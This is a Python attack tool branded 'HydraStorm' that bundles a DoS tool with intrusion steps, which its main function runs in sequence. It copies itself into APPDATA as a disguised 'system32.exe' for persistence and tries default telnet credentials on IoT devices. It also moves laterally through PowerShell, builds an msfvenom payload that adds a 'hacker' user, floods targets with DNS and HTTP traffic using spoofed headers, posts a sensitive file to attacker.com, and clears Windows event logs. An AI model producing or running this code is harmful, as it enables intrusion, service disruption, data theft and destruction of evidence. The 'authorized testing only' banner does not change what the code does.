from colorama import Fore, Style, init
from art import text2art
import socket
import ssl
import time
import logging
import configparser
import aiohttp
import asyncio
import random
import os
from sys import exit
from aiohttp import ClientSession, ClientTimeout, TCPConnector
from fake_useragent import UserAgent
import scapy.all as scapy
import subprocess
import shutil
import requests

init(autoreset=True)

# Configure logging
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

class Config:
    def __init__(self):
        self.config = configparser.ConfigParser()
        self.config['DEFAULT'] = {
            'target': 'example.com',
            'duration': '60',
            'threads': '50'
        }
        try:
            self.config.read('config.ini')
            self.target = self.config.get('DEFAULT', 'target')
            self.duration = int(self.config.get('DEFAULT', 'duration'))
            self.threads = int(self.config.get('DEFAULT', 'threads'))
        except configparser.NoOptionError as e:
            logging.error(f"Missing option in config.ini: {e}")
            exit(1)
        except configparser.NoSectionError as e:
            logging.error(f"Missing section in config.ini: {e}")
            exit(1)
        except Exception as e:
            logging.error(f"Error reading config.ini: {e}")
            exit(1)

class AdvancedEvasion:
    @staticmethod
    def get_tls_context(browser: str = "chrome"):
        """Mimics different browser TLS fingerprints"""
        ctx = ssl.create_default_context()
        if browser == "chrome":
            ctx.set_ciphers('ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256')
            ctx.options |= ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1
        elif browser == "firefox":
            ctx.set_ciphers('ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384')
            ctx.options |= ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1
        return ctx

    @staticmethod
    def iot_exploit(target_ip):
        """Simulates IoT device exploitation"""
        common_creds = [
            ("admin", "admin"),
            ("root", "12345"),
            ("user", "password")
        ]
        for user, pwd in common_creds:
            try:
                with socket.create_connection((target_ip, 23), timeout=2) as sock:
                    sock.send(f"{user}:{pwd}\n".encode())
                    response = sock.recv(1024)
                    if b"Login successful" in response:
                        logging.info(f"IoT exploit success: {user}:{pwd}")
                        return True
            except Exception as e:
                logging.debug(f"Exception in iot_exploit: {e}")
                continue
        return False

    @staticmethod
    def establish_persistence():
        """Establish persistence by creating a backdoor"""
        backdoor_path = os.path.join(os.environ['APPDATA'], 'system32.exe')
        shutil.copyfile(__file__, backdoor_path)
        logging.info(f"Backdoor established at {backdoor_path}")

    @staticmethod
    def lateral_movement():
        """Simulate lateral movement using legitimate tools"""
        try:
            # Example: Use PowerShell to execute a command on a remote system
            subprocess.run(['powershell', '-Command', 'Invoke-Command -ComputerName remote_host -ScriptBlock { whoami }'], check=True)
            logging.info("Lateral movement successful")
        except Exception as e:
            logging.error(f"Lateral movement failed: {e}")

    @staticmethod
    def privilege_escalation():
        """Simulate privilege escalation using a known exploit"""
        try:
            # Example: Use a known exploit to escalate privileges
            subprocess.run(['msfvenom', '-p', 'windows/exec', 'CMD=net user hacker Password /add', 'Format=exe', '-o', 'escalate.exe'], check=True)
            subprocess.run(['escalate.exe'], check=True)
            logging.info("Privilege escalation successful")
        except Exception as e:
            logging.error(f"Privilege escalation failed: {e}")

    @staticmethod
    def data_exfiltration():
        """Simulate data exfiltration using encrypted channels"""
        try:
            # Example: Use HTTPS to exfiltrate data
            with open('sensitive_data.txt', 'rb') as f:
                data = f.read()
            response = requests.post('https://attacker.com/exfiltrate', data=data, headers={'Authorization': 'Bearer fake_token'})
            if response.status_code == 200:
                logging.info("Data exfiltration successful")
            else:
                logging.error("Data exfiltration failed")
        except Exception as e:
            logging.error(f"Data exfiltration failed: {e}")

    @staticmethod
    def cover_tracks():
        """Cover tracks by cleaning up logs and removing evidence"""
        try:
            # Example: Clear event logs
            subprocess.run(['wevtutil', 'cl', 'System'], check=True)
            subprocess.run(['wevtutil', 'cl', 'Security'], check=True)
            logging.info("Tracks covered")
        except Exception as e:
            logging.error(f"Failed to cover tracks: {e}")


class EnhancedLogging:
    def __init__(self):
        self.tcp_handshakes = 0
        self.tcp_failures = 0
        self.retransmits = 0

    def log_packet_metrics(self, packet):
        """Uses scapy for advanced network metrics"""
        if packet.haslayer(scapy.TCP):
            if packet[scapy.TCP].flags == 'S':
                self.tcp_handshakes += 1
            elif packet[scapy.TCP].flags == 'R':
                self.tcp_failures += 1
            elif packet[scapy.TCP].flags & 0x04:
                self.retransmits += 1

class HTTPFlood:
    def __init__(self, logger: EnhancedLogging, config: Config):
        self.logger = logger
        self.config = config
        self.tls_ctx = AdvancedEvasion.get_tls_context()

    async def _send_request(self, session: ClientSession, target: str):
        headers = {
            "User-Agent": UserAgent().random,
            "X-Forwarded-For": self._spoof_ip(),
            "Accept": "text/html,application/xhtml+xml",
            "Accept-Language": "en-US,en;q=0.9",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-Mode": "navigate",
            "Cookie": f"session={random.getrandbits(128):x}"
        }

        try:
            async with session.get(
                f"https://{target}",  # Force HTTPS
                headers=headers,
                ssl=self.tls_ctx,
                timeout=ClientTimeout(total=3)
            ) as response:
                await response.read()
                self.logger.log_packet_metrics(scapy.IP()/scapy.TCP())
                return True
        except Exception as e:
            logging.debug(f"Exception in _send_request: {e}")
            self.logger.log_packet_metrics(scapy.IP()/scapy.TCP(flags='R'))
            return False

    def _spoof_ip(self):
        """OSI Layer 3 spoofing simulation"""
        return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"

    async def run(self, target: str, port: int, duration: int):
        connector = TCPConnector(limit=self.config.threads)
        async with ClientSession(connector=connector) as session:
            tasks = []
            for _ in range(self.config.threads):
                tasks.append(self._send_request(session, target))
            await asyncio.gather(*tasks, return_exceptions=True)

class DNSAmplifier:
    def __init__(self, logger: EnhancedLogging):
        self.logger = logger
        self.dns_servers = ['8.8.8.8', '1.1.1.1']

    def run(self, target_ip: str, duration: int):
        query = scapy.DNSQR(qname="example.com", qtype="ANY")
        dns_pkt = scapy.IP(dst=self.dns_servers[0])/scapy.UDP(dport=53)/scapy.DNS(qd=query)

        start = time.time()
        while time.time() - start < duration:
            scapy.send(dns_pkt, verbose=0)
            self.logger.log_packet_metrics(dns_pkt)

def main():
    config = Config()
    logger = EnhancedLogging()

    print(Fore.BLUE + r"""
     /\
    /  \
   /____\
   |    |
   |HYDRA|
   |STORM|
  /|    |\
 / |    | \
/  |    |  \
   /____\
   \    /
    \  /
     \/""" + Fore.RESET)
    print(Fore.BLUE + " " * 7 + "C4l3bpy | Gray Hat")
    print(Fore.RED + "=" * 60)
    print(Fore.YELLOW + "For authorized penetration testing only")
    print(Fore.MAGENTA + "| " + Fore.GREEN + "Don't test if you are not given the greenlight")
    print(Fore.RED + "=" * 60)
    print(Fore.CYAN + Style.BRIGHT + "HydraStorm is an advanced Dos tool")
    
    AdvancedEvasion.establish_persistence()
    
    if AdvancedEvasion.iot_exploit(config.target):
        print(Fore.RED + "[+] IoT device compromised")

    AdvancedEvasion.lateral_movement()

    AdvancedEvasion.privilege_escalation()

    # DNS Amplification Demo
    dns = DNSAmplifier(logger)
    dns.run(config.target, config.duration)

    # HTTP Flood with Modern Evasion
    http = HTTPFlood(logger, config)
    asyncio.run(http.run(config.target, 443, config.duration))

    # Data Exfiltration
    AdvancedEvasion.data_exfiltration()

    # Cover Tracks
    AdvancedEvasion.cover_tracks()

    print(Fore.YELLOW + f"\nAttack Metrics:")
    print(Fore.WHITE + f"TCP Handshakes: {logger.tcp_handshakes}")
    print(Fore.WHITE + f"TCP Failures: {logger.tcp_failures}")
    print(Fore.WHITE + f"Retransmits: {logger.retransmits}")

if __name__ == "__main__":
    main()